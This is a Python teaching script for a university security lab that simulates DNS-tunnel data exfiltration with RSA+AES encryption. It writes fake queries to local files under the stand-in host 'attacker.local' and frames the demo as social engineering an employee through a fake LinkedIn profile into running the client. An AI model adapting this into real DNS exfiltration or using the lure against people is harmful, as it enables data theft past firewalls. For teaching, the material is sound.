#!/usr/bin/env python3
"""
Lab 7-P1: Simplified DNS Tunneling with RSA Encryption
CSC323 Information Security

This simplified version uses higher-level DNS libraries
and is easier to test in VM environments.
"""

import base64
import sys
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from datetime import datetime
import json
import subprocess
import time

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    """Display lab banner"""
    banner = f"""
{Colors.HEADER}╔═══════════════════════════════════════════════════════════╗
║  Lab 7-P1: DNS Tunneling Firewall Bypass                 ║
║  CSC323 Information Security                              ║
║  Simplified Implementation for VM Testing                 ║
╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}
    """
    print(banner)

def log_event(event_type, message):
    """Log events to file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} | {event_type} | {message}\n"
    
    os.makedirs("logs", exist_ok=True)
    with open("logs/firewall_bypass.log", "a") as f:
        f.write(log_entry)
    
    print(f"{Colors.OKCYAN}[LOG]{Colors.ENDC} {event_type}: {message}")

class HybridEncryption:
    """
    Hybrid encryption using RSA + AES
    RSA for key exchange, AES for data encryption
    """
    
    def __init__(self):
        self.rsa_private_key = None
        self.rsa_public_key = None
        self.rsa_cipher = None
    
    def generate_rsa_keys(self, key_size=2048):
        """Generate RSA key pair"""
        print(f"\n{Colors.OKBLUE}[*] Generating RSA keys ({key_size} bits)...{Colors.ENDC}")
        
        key = RSA.generate(key_size)
        self.rsa_private_key = key
        self.rsa_public_key = key.publickey()
        
        print(f"{Colors.OKGREEN}[+] RSA keys generated successfully{Colors.ENDC}")
        log_event("RSA_KEYGEN", f"Generated {key_size}-bit RSA key pair")
        
        return self.rsa_public_key, self.rsa_private_key
    
    def save_public_key(self, filename="public_key.pem"):
        """Save public key to file"""
        with open(filename, "wb") as f:
            f.write(self.rsa_public_key.export_key())
        print(f"{Colors.OKGREEN}[+] Public key saved to {filename}{Colors.ENDC}")
        log_event("KEY_EXPORT", f"Public key saved to {filename}")
    
    def load_public_key(self, filename="public_key.pem"):
        """Load public key from file"""
        with open(filename, "rb") as f:
            self.rsa_public_key = RSA.import_key(f.read())
        print(f"{Colors.OKGREEN}[+] Public key loaded from {filename}{Colors.ENDC}")
    
    def encrypt_data(self, data):
        """
        Encrypt data using hybrid encryption:
        1. Generate random AES key
        2. Encrypt data with AES
        3. Encrypt AES key with RSA
        """
        if isinstance(data, str):
            data = data.encode()
        
        # Generate random AES key
        aes_key = get_random_bytes(32)  # 256-bit AES key
        
        # Encrypt data with AES
        cipher_aes = AES.new(aes_key, AES.MODE_CBC)
        ciphertext = cipher_aes.encrypt(pad(data, AES.block_size))
        
        # Encrypt AES key with RSA
        cipher_rsa = PKCS1_OAEP.new(self.rsa_public_key)
        encrypted_aes_key = cipher_rsa.encrypt(aes_key)
        
        # Combine: encrypted_key_length + encrypted_key + iv + ciphertext
        result = len(encrypted_aes_key).to_bytes(2, 'big')
        result += encrypted_aes_key
        result += cipher_aes.iv
        result += ciphertext
        
        return result
    
    def decrypt_data(self, encrypted_data):
        """
        Decrypt data using hybrid encryption
        """
        # Extract encrypted AES key length
        key_length = int.from_bytes(encrypted_data[:2], 'big')
        
        # Extract encrypted AES key
        encrypted_aes_key = encrypted_data[2:2+key_length]
        
        # Extract IV and ciphertext
        iv = encrypted_data[2+key_length:2+key_length+16]
        ciphertext = encrypted_data[2+key_length+16:]
        
        # Decrypt AES key with RSA
        cipher_rsa = PKCS1_OAEP.new(self.rsa_private_key)
        aes_key = cipher_rsa.decrypt(encrypted_aes_key)
        
        # Decrypt data with AES
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
        data = unpad(cipher_aes.decrypt(ciphertext), AES.block_size)
        
        return data

class DNSTunnelSimulator:
    """
    Simplified DNS Tunnel Simulator
    Uses file-based communication to simulate DNS queries
    (easier for VM testing without network complexity)
    """
    
    def __init__(self, shared_dir="./dns_tunnel_shared"):
        self.shared_dir = shared_dir
        self.encryption = HybridEncryption()
        os.makedirs(shared_dir, exist_ok=True)
    
    def setup_server(self):
        """Setup server (attacker) side"""
        print(f"\n{Colors.HEADER}=== Setting up DNS Tunnel Server (Attacker) ==={Colors.ENDC}")
        
        # Generate RSA keys
        self.encryption.generate_rsa_keys()
        
        # Save public key for client
        public_key_path = os.path.join(self.shared_dir, "public_key.pem")
        with open(public_key_path, "wb") as f:
            f.write(self.encryption.rsa_public_key.export_key())
        
        print(f"{Colors.OKGREEN}[+] Public key saved to shared directory{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Client should use this key for encryption{Colors.ENDC}")
        
        log_event("SERVER_SETUP", "DNS tunnel server initialized")
    
    def setup_client(self):
        """Setup client (target) side"""
        print(f"\n{Colors.HEADER}=== Setting up DNS Tunnel Client (Target) ==={Colors.ENDC}")
        
        # Load server's public key
        public_key_path = os.path.join(self.shared_dir, "public_key.pem")
        
        if not os.path.exists(public_key_path):
            print(f"{Colors.FAIL}[!] Public key not found. Run server first!{Colors.ENDC}")
            sys.exit(1)
        
        with open(public_key_path, "rb") as f:
            self.encryption.rsa_public_key = RSA.import_key(f.read())
        
        print(f"{Colors.OKGREEN}[+] Loaded server's public key{Colors.ENDC}")
        log_event("CLIENT_SETUP", "DNS tunnel client initialized")
    
    def exfiltrate_data(self, data, filename_prefix="exfil"):
        """
        Client: Exfiltrate data via simulated DNS query
        """
        print(f"\n{Colors.OKBLUE}[*] Exfiltrating data via DNS tunnel...{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Data: {data}{Colors.ENDC}")
        
        # Encrypt data
        encrypted_data = self.encryption.encrypt_data(data)
        print(f"{Colors.OKGREEN}[+] Data encrypted (RSA + AES hybrid){Colors.ENDC}")
        
        # Base64 encode for DNS-safe transmission
        encoded_data = base64.b64encode(encrypted_data).decode()
        print(f"{Colors.OKGREEN}[+] Data base64 encoded{Colors.ENDC}")
        
        # Simulate DNS query by writing to shared file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        query_file = os.path.join(self.shared_dir, f"{filename_prefix}_{timestamp}.dns")
        
        with open(query_file, "w") as f:
            json.dump({
                'timestamp': datetime.now().isoformat(),
                'query': f"{encoded_data}.attacker.local",
                'encoded_data': encoded_data,
                'original_length': len(data),
                'encrypted_length': len(encrypted_data)
            }, f, indent=2)
        
        print(f"{Colors.OKGREEN}[+] DNS query saved: {query_file}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Simulated DNS query: {encoded_data[:60]}...attacker.local{Colors.ENDC}")
        
        log_event("DATA_EXFIL", f"Exfiltrated: {data}")
    
    def receive_data(self):
        """
        Server: Receive and decrypt exfiltrated data
        """
        print(f"\n{Colors.OKBLUE}[*] Monitoring for DNS queries...{Colors.ENDC}")
        
        # Find all .dns files
        dns_files = [f for f in os.listdir(self.shared_dir) if f.endswith('.dns')]
        
        if not dns_files:
            print(f"{Colors.WARNING}[!] No DNS queries found{Colors.ENDC}")
            return []
        
        received_data = []
        
        for dns_file in sorted(dns_files):
            filepath = os.path.join(self.shared_dir, dns_file)
            
            try:
                with open(filepath, 'r') as f:
                    query_data = json.load(f)
                
                print(f"\n{Colors.OKCYAN}[*] Processing: {dns_file}{Colors.ENDC}")
                
                # Decode base64
                encrypted_data = base64.b64decode(query_data['encoded_data'])
                
                # Decrypt
                decrypted_data = self.encryption.decrypt_data(encrypted_data)
                decrypted_text = decrypted_data.decode()
                
                print(f"{Colors.OKGREEN}[+] DECRYPTED DATA: {decrypted_text}{Colors.ENDC}")
                
                received_data.append({
                    'file': dns_file,
                    'timestamp': query_data['timestamp'],
                    'data': decrypted_text
                })
                
                log_event("DATA_RECEIVED", decrypted_text)
                
                # Archive processed file
                archive_path = filepath.replace('.dns', '.processed')
                os.rename(filepath, archive_path)
            
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error processing {dns_file}: {e}{Colors.ENDC}")
        
        return received_data

def demonstrate_firewall_bypass():
    """
    Demonstrate the complete firewall bypass scenario
    """
    print_banner()
    
    print(f"""
{Colors.HEADER}╔═══════════════════════════════════════════════════════════╗
║  SCENARIO DEMONSTRATION                                   ║
╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}

{Colors.OKBLUE}Environment:{Colors.ENDC}
  • Network with firewall blocking non-standard ports
  • Firewall allows HTTP and DNS traffic
  • Attacker: Outside the network
  • Target Employee: Inside the network

{Colors.OKBLUE}Attack Strategy:{Colors.ENDC}
  • Social engineering via fake LinkedIn profile
  • Gain trust and get employee to run "client" code
  • Exfiltrate data via DNS queries (bypass firewall)
  • RSA + AES encryption for confidentiality

{Colors.WARNING}Press Enter to begin demonstration...{Colors.ENDC}
    """)
    input()
    
    # Initialize tunnel
    tunnel = DNSTunnelSimulator()
    
    # Phase 1: Server Setup (Attacker)
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"PHASE 1: Attacker Sets Up DNS Tunnel Server")
    print(f"{'='*60}{Colors.ENDC}\n")
    time.sleep(1)
    
    tunnel.setup_server()
    
    print(f"\n{Colors.WARNING}[*] Attacker distributes malicious client to target employee...")
    print(f"[*] (via fake LinkedIn message, email attachment, etc.){Colors.ENDC}")
    time.sleep(2)
    
    # Phase 2: Client Setup (Target Employee)
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"PHASE 2: Target Employee Runs Client Code")
    print(f"{'='*60}{Colors.ENDC}\n")
    time.sleep(1)
    
    tunnel.setup_client()
    
    # Phase 3: Data Exfiltration
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"PHASE 3: Exfiltrating Sensitive Data via DNS")
    print(f"{'='*60}{Colors.ENDC}\n")
    time.sleep(1)
    
    # Simulate exfiltrating different types of data
    sensitive_data = [
        "username:admin password:SecretPass123",
        "credit_card:4532-1234-5678-9010 exp:12/25 cvv:123",
        "social_security:123-45-6789",
        "confidential_memo:Project_Phoenix_Budget_$5M"
    ]
    
    for i, data in enumerate(sensitive_data, 1):
        print(f"\n{Colors.OKCYAN}--- Exfiltration {i}/{len(sensitive_data)} ---{Colors.ENDC}")
        tunnel.exfiltrate_data(data)
        time.sleep(1)
    
    # Phase 4: Server Receives Data
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"PHASE 4: Attacker Receives and Decrypts Data")
    print(f"{'='*60}{Colors.ENDC}\n")
    time.sleep(1)
    
    received = tunnel.receive_data()
    
    # Summary
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"ATTACK SUMMARY")
    print(f"{'='*60}{Colors.ENDC}\n")
    
    print(f"{Colors.OKGREEN}[+] Total records exfiltrated: {len(received)}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Firewall bypass: SUCCESSFUL{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Encryption used: RSA-2048 + AES-256{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Detection by firewall: NONE (DNS traffic allowed){Colors.ENDC}")
    
    # Save summary
    summary = {
        'attack_date': datetime.now().isoformat(),
        'records_exfiltrated': len(received),
        'encryption': 'RSA-2048 + AES-256',
        'bypass_method': 'DNS Tunneling',
        'data': received
    }
    
    with open('attack_summary.json', 'w') as f:
        json.dump(summary, f, indent=2)
    
    print(f"\n{Colors.OKGREEN}[+] Full report saved to attack_summary.json{Colors.ENDC}")
    log_event("DEMO_COMPLETE", f"Exfiltrated {len(received)} records")

def interactive_client():
    """Interactive client mode for testing"""
    print_banner()
    
    tunnel = DNSTunnelSimulator()
    tunnel.setup_client()
    
    print(f"\n{Colors.OKBLUE}[*] Interactive Data Exfiltration Mode{Colors.ENDC}")
    print(f"{Colors.WARNING}[*] Enter data to exfiltrate (or 'quit' to exit):{Colors.ENDC}\n")
    
    while True:
        try:
            data = input(f"{Colors.OKCYAN}Data> {Colors.ENDC}")
            
            if data.lower() in ['quit', 'exit', 'q']:
                print(f"{Colors.OKGREEN}[+] Exiting...{Colors.ENDC}")
                break
            
            if not data.strip():
                continue
            
            tunnel.exfiltrate_data(data)
        
        except KeyboardInterrupt:
            print(f"\n{Colors.OKGREEN}[+] Exiting...{Colors.ENDC}")
            break

def interactive_server():
    """Interactive server mode for testing"""
    print_banner()
    
    tunnel = DNSTunnelSimulator()
    tunnel.setup_server()
    
    print(f"\n{Colors.OKBLUE}[*] DNS Tunnel Server Running{Colors.ENDC}")
    print(f"{Colors.WARNING}[*] Press Enter to check for new data, or 'quit' to exit{Colors.ENDC}\n")
    
    while True:
        try:
            cmd = input(f"{Colors.OKCYAN}Command> {Colors.ENDC}")
            
            if cmd.lower() in ['quit', 'exit', 'q']:
                print(f"{Colors.OKGREEN}[+] Exiting...{Colors.ENDC}")
                break
            
            tunnel.receive_data()
        
        except KeyboardInterrupt:
            print(f"\n{Colors.OKGREEN}[+] Exiting...{Colors.ENDC}")
            break

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Lab 7-P1: DNS Tunneling Firewall Bypass (Simplified)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Run full demonstration
  python3 %(prog)s demo
  
  # Run as server (attacker)
  python3 %(prog)s server
  
  # Run as client (target employee)
  python3 %(prog)s client
        '''
    )
    
    parser.add_argument(
        'mode',
        choices=['demo', 'server', 'client'],
        help='demo: Full demonstration | server: Server mode | client: Client mode'
    )
    
    args = parser.parse_args()
    
    if args.mode == 'demo':
        demonstrate_firewall_bypass()
    elif args.mode == 'server':
        interactive_server()
    else:  # client
        interactive_client()

if __name__ == "__main__":
    main()
